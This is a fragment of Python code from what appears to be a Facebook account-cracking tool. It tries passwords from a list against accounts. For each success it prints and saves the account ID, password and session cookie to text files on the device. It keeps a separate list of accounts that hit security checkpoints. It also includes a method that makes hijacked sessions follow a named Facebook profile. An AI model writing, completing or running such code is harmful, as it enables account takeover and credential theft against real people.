...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/AdnanSami3697?mibextid=ZbWKwL', {
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[ADNAN_Sami-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ADNAN_Sami-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[ADNAN_Sami-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ADNAN_Sami-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
